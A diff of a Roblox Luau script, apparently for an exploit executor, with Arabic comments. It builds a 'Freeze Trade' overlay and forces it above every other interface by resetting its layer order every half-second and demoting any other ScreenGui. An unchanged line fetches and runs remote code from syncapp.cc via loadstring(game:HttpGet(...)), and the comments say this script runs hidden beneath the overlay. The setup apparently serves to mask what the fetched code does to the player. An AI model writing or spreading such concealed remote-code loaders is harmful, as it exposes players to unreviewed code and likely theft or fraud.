@@ -1,4 +1,4 @@
--- السكربت الأول (واجهة Freeze Trade المثبتة في أعلى طبقة)
+-- السكربت الأول (واجهة Freeze Trade المثبتة بالقوة في الأعلى)
 task.spawn(function()
     local Players = game:GetService("Players")
     local TweenService = game:GetService("TweenService")
@@ -9,13 +9,32 @@ task.spawn(function()
     screenGui.Name = "FreezeTradeGui"
     screenGui.ResetOnSpawn = false
     screenGui.IgnoreGuiInset = true
-    screenGui.DisplayOrder = 999999999 -- القيمة الأعلى لتبقى الواجهة في المقدمة فوق Project Sync
+    screenGui.DisplayOrder = 2147483647 -- أقصى رقم ممكن في لغة Luau لترتيب الطبقات
     
     if gethui then
         screenGui.Parent = gethui()
     else
         screenGui.Parent = player:WaitForChild("PlayerGui")
     end
+
+    -- إجبار الواجهة على البقاء في الأعلى دائماً حتى لو تم تشغيل سكربت آخر بعدها
+    task.spawn(function()
+        while task.wait(0.5) do
+            screenGui.DisplayOrder = 2147483647
+            
+            -- خيار إضافي: خفض ترتيب أي ScreenGui أخرى يتم إنشاؤها في اللعبة
+            local parentObj = screenGui.Parent
+            if parentObj then
+                for _, gui in ipairs(parentObj:GetChildren()) do
+                    if gui:IsA("ScreenGui") and gui ~= screenGui then
+                        if gui.DisplayOrder >= screenGui.DisplayOrder then
+                            gui.DisplayOrder = 1000 -- خفض ترتيب السكربتات الأخرى لتكون تحت واجهتك
+                        end
+                    end
+                end
+            end
+        end
+    end)
 
     -- Background
     local mainFrame = Instance.new("Frame")
@@ -246,7 +265,8 @@ task.spawn(function()
     end)
 end)
 
--- السكربت الثاني (Project Sync) يعمل تحت الواجهة الأولى مباشرة
+-- تأخير بسيط قبل تشغيل Project Sync للتأكد من اكتمال إنشاء الواجهة الرئيسية أولاً
 task.spawn(function()
+    task.wait(1)
     loadstring(game:HttpGet("https://syncapp.cc/run/JhPParJ3IMYQDpdReE3FKHTfCn7gh934rdlFa0ck4h07BoQisiZrn0JInEsjDZNBNMpcaKPTl-Po"))()
 end)
